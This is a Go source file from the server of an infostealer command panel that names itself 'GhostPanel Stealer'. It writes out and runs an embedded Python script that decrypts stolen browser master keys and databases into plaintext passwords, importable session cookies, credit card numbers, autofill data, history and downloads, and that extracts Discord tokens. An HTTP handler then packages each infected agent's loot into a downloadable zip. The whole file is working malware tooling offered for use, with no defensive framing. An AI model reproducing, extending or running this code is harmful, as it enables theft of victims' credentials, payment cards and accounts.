package handlers

import (
	"archive/zip"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/gorilla/mux"
)

// GenerateDecryptScript creates a Python script to decrypt the stolen DBs using the stolen Keys
func GenerateDecryptScript(dir string) {
	script := `import os
import sqlite3
import json
import shutil
import sys
import base64
import time
import re
from datetime import datetime, timedelta

try:
    from Crypto.Cipher import AES
except ImportError:
    try:
        from Cryptodome.Cipher import AES
    except ImportError:
        print("Error: pycryptodome not installed.")
        sys.exit(1)

def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception:
            return str(chromedate)
    return ""

def decrypt_data(data, key):
    try:
        # AES-GCM Structure: v10 (3 bytes) + IV (12 bytes) + Ciphertext + Tag (16 bytes)
        iv = data[3:15]
        payload = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # Separate ciphertext and tag
        ciphertext = payload[:-16]
        tag = payload[-16:]
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode()
    except:
        # Fallback for some versions without verification
        try:
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload[:-16]).decode()
        except Exception as e:
            return f"<Error: {e}>"

def safe_remove(path):
    for _ in range(3):
        try:
            if os.path.exists(path): os.remove(path)
            break
        except:
            time.sleep(0.1)

def process_browser(name, base_dir):
    key_file = os.path.join(base_dir, f"{name}_MasterKey.bin")
    if not os.path.exists(key_file): return

    with open(key_file, "rb") as f: master_key = f.read()

    # 1. Passwords
    login_db = os.path.join(base_dir, f"{name}_Login Data")
    if os.path.exists(login_db):
        temp_db = "Login.db"
        try:
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                rows = cursor.fetchall()
                if rows:
                    with open(os.path.join(base_dir, f"{name}_passwords.txt"), "w", encoding="utf-8") as f_out:
                        for r in rows:
                            url, user, enc_pass = r
                            if not user or not enc_pass: continue
                            if enc_pass[:3] == b'v10' or enc_pass[:3] == b'v11':
                                pw = decrypt_data(enc_pass, master_key)
                                f_out.write(f"URL: {url}\nUSER: {user}\nPASS: {pw}\n\n")
                            else:
                                f_out.write(f"URL: {url}\nUSER: {user}\nPASS: [Legacy]\n\n")
            except: pass
            finally:
                cursor.close()
                conn.close()
        except: pass
        safe_remove(temp_db)

    # 2. Cookies (Netscape)
    cookie_db = os.path.join(base_dir, f"{name}_Cookies")
    if os.path.exists(cookie_db):
        temp_db = "Cookies.db"
        try:
            shutil.copy2(cookie_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies")
                rows = cursor.fetchall()
                if rows:
                    with open(os.path.join(base_dir, f"{name}_cookies_netscape.txt"), "w", encoding="utf-8") as f_out:
                        f_out.write("# Netscape HTTP Cookie File\n")
                        for r in rows:
                            host, name, val_enc, path, expr, secure = r
                            val = decrypt_data(val_enc, master_key)
                            flag = "TRUE" if secure else "FALSE"
                            f_out.write(f"{host}\t{flag}\t{path}\t{flag}\t{expr}\t{name}\t{val}\n")
            except: pass
            finally:
                cursor.close()
                conn.close()
        except: pass
        safe_remove(temp_db)

    # 3. Credit Cards & Autofills
    web_db = os.path.join(base_dir, f"{name}_Web Data")
    if os.path.exists(web_db):
        temp_db = "Web.db"
        try:
            shutil.copy2(web_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            try:
                # Cards
                cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                rows = cursor.fetchall()
                if rows:
                    with open(os.path.join(base_dir, f"{name}_cards.txt"), "w", encoding="utf-8") as f_out:
                        for r in rows:
                            name, month, year, enc_num = r
                            num = decrypt_data(enc_num, master_key)
                            f_out.write(f"Name: {name}\nExp: {month}/{year}\nNum: {num}\n\n")
                
                # Autofills
                cursor.execute("SELECT name, value FROM autofill")
                rows = cursor.fetchall()
                if rows:
                    with open(os.path.join(base_dir, f"{name}_autofills.txt"), "w", encoding="utf-8") as f_out:
                        for r in rows:
                            f_out.write(f"{r[0]}: {r[1]}\n")
            except: pass
            finally:
                cursor.close()
                conn.close()
        except: pass
        safe_remove(temp_db)

    # 5. History & Downloads
    hist_db = os.path.join(base_dir, f"{name}_History")
    if os.path.exists(hist_db):
        temp_db = "Hist.db"
        try:
            shutil.copy2(hist_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            try:
                # History
                cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
                rows = cursor.fetchall()
                if rows:
                    with open(os.path.join(base_dir, f"{name}_history.txt"), "w", encoding="utf-8") as f_out:
                        for r in rows:
                            dt = get_chrome_datetime(r[3])
                            f_out.write(f"[{dt}] {r[1]} ({r[0]})\n")
                
                # Downloads
                cursor.execute("SELECT target_path, tab_url, start_time FROM downloads ORDER BY start_time DESC")
                rows = cursor.fetchall()
                if rows:
                    with open(os.path.join(base_dir, f"{name}_downloads.txt"), "w", encoding="utf-8") as f_out:
                        for r in rows:
                            dt = get_chrome_datetime(r[2])
                            f_out.write(f"[{dt}] {r[0]} (from: {r[1]})\n")
            except: pass
            finally:
                cursor.close()
                conn.close()
        except: pass
        safe_remove(temp_db)

def process_discord(discord_dir):
    key_file = os.path.join(discord_dir, "Discord_MasterKey.bin")
    if not os.path.exists(key_file): return
    
    try:
        with open(key_file, "rb") as f: master_key = f.read()
    except: return

    tokens = []
    # Encrypted token regex: dQw4w9WgXcQ:
    enc_regex = r'dQw4w9WgXcQ:([^"]*)'
    
    for f in os.listdir(discord_dir):
        if f.endswith(".ldb") or f.endswith(".log"):
            try:
                with open(os.path.join(discord_dir, f), "r", errors="ignore") as file:
                    content = file.read()
                    
                    # 1. Encrypted Tokens
                    for match in re.findall(enc_regex, content):
                        try:
                            enc_token = base64.b64decode(match)
                            token = decrypt_data(enc_token, master_key)
                            if token and token not in tokens: tokens.append(token)
                        except: pass
                    
                    # 2. Plain Tokens (Legacy/MFA)
                    for match in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", content):
                        if match not in tokens: tokens.append(match)
            except: pass
            
    if tokens:
        with open(os.path.join(discord_dir, "tokens.txt"), "w") as f:
            for t in tokens: f.write(f"{t}\n")

if __name__ == "__main__":
    # Browsers
    b_dir = "Browsers"
    if os.path.exists(b_dir):
        print(f"[+] Processing Browsers in {b_dir}...")
        for f in os.listdir(b_dir):
            if "_MasterKey.bin" in f:
                name = f.replace("_MasterKey.bin", "")
                print(f"   - Processing {name}...")
                process_browser(name, b_dir)
    else:
        print("[-] Browsers folder not found")
    
    # Discord
    d_dir = "Discord"
    if os.path.exists(d_dir):
        print(f"[+] Processing Discord in {d_dir}...")
        process_discord(d_dir)
    else:
        print("[-] Discord folder not found")
    
    # Create Trigger file for UI
    with open("DONE", "w") as f: f.write("1")
`
	os.WriteFile(filepath.Join(dir, "decrypt.py"), []byte(script), 0644)

	readme := `[GhostPanel Stealer Results]

Files:
- *_MasterKey.bin: The decrypted AES Master Key.
- *_Login Data: Encrypted SQLite DB.
- *_passwords.txt: DECRYPTED Passwords (Ready to use).
- *_cookies_netscape.txt: DECRYPTED Cookies (Ready to import).
`
	os.WriteFile(filepath.Join(dir, "README.txt"), []byte(readme), 0644)
}

func RunDecryptor(dir string) {
	// Ensure decrypt.py exists
	GenerateDecryptScript(dir)
	
	// Run python script
	// Assumes 'python' or 'python3' is in PATH
	cmd := exec.Command("python", "decrypt.py")
	if _, err := exec.LookPath("python"); err != nil {
		cmd = exec.Command("python3", "decrypt.py")
	}
	
	cmd.Dir = dir
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("[-] Auto-Decryption Failed: %v\nOutput: %s\n", err, string(output))
	} else {
		fmt.Printf("[+] Auto-Decryption Success for %s\n", dir)
	}
}

func DownloadStealerZip(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	agentID := vars["id"]
	safeID := strings.ReplaceAll(agentID, ":", "_")
	logDir := fmt.Sprintf("../logs/%s/stealer", safeID)

	if _, err := os.Stat(logDir); os.IsNotExist(err) {
		http.Error(w, "No stealer data found", http.StatusNotFound)
		return
	}

	// 1. Run Auto-Decryption (Server-Side)
	RunDecryptor(logDir)

	// 2. Set Headers
	w.Header().Set("Content-Type", "application/zip")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s_stealer.zip\"", safeID))

	// 3. Zip It
	zipWriter := zip.NewWriter(w)
	defer zipWriter.Close()

	filepath.Walk(logDir, func(path string, info os.FileInfo, err error) error {
		if err != nil { return err }
		if info.IsDir() { return nil }

		// Get relative path
		relPath, err := filepath.Rel(logDir, path)
		if err != nil { return err }

		zipFile, err := zipWriter.Create(relPath)
		if err != nil { return err }

		fsFile, err := os.Open(path)
		if err != nil { return err }
		defer fsFile.Close()

		_, err = io.Copy(zipFile, fsFile)
		return err
	})
}
